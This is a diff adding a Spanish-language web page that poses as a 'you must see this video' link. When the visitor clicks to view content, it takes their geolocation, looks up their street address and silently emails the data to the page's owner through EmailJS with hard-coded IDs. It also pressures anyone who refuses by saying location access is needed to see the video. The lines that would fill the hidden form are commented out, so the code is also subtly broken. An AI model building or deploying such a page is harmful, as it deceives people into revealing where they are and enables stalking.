@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Obtener Ubicación con Detalles</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      margin-top: 50px;
+    }
+    button {
+      padding: 10px 20px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+    #ubicacion, #error {
+      margin-top: 20px;
+      font-size: 18px;
+    }
+    #error {
+      color: red;
+    }
+  </style>
+  <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+</head>
+<body>
+
+  <h1>Debes ver este video</h1>
+  <p>Haz clic en el botón para ver el contenido.</p>
+
+  <button onclick="obtenerUbicacion()">Mostrar Contenido</button>
+
+  <div id="ubicacion"></div>
+  <div id="error"></div>
+
+  <!-- Formulario oculto para enviar datos -->
+  <form id="contact-form" style="display:none;">
+    <input type="hidden" name="resultado" id="resultado">
+  </form>
+
+  <script>
+    emailjs.init("ocAv84lXHr4gAKLqP"); // Tu USER ID de EmailJS
+
+    function obtenerUbicacion() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(mostrarPosicion, mostrarError);
+      } else {
+        document.getElementById("error").innerText = "Geolocalización no soportada por este navegador.";
+      }
+    }
+
+    function mostrarPosicion(posicion) {
+      const lat = posicion.coords.latitude;
+      const lon = posicion.coords.longitude;
+
+      const fechaHora = new Date().toLocaleString();
+
+      // Llamar a la API de geocodificación inversa
+      fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`)
+        .then(res => res.json())
+        .then(data => {
+          const direccion = data.display_name || "Dirección no disponible";
+
+          const resumen = `Fecha/Hora: ${fechaHora}\nLatitud: ${lat}\nLongitud: ${lon}\nDirección aproximada: ${direccion}`;
+
+          //document.getElementById("ubicacion").innerText = resumen;
+          //document.getElementById("resultado").value = resumen;
+
+          // Enviar automáticamente
+          emailjs.sendForm('service_epkqnyh', 'template_65vhrq8', document.getElementById('contact-form'))
+            .then(() => {
+              alert("¡excelente!");
+            })
+            .catch(error => {
+              alert("Error al enviar: " + JSON.stringify(error));
+            });
+        })
+        .catch(() => {
+          document.getElementById("error").innerText = "No se pudo obtener.";
+        });
+    }
+
+    function mostrarError(error) {
+      let mensaje;
+      switch (error.code) {
+        case error.PERMISSION_DENIED:
+          mensaje = "Debes permitir el acceso a tu ubicación para ver contenido.";
+          break;
+        case error.POSITION_UNAVAILABLE:
+          mensaje = "no disponible.";
+          break;
+        case error.TIMEOUT:
+          mensaje = "Tiempo de espera agotado.";
+          break;
+        default:
+          mensaje = "Error desconocido.";
+      }
+      document.getElementById("error").innerText = "Error: " + mensaje;
+    }
+  </script>
+
+</body>
+</html>
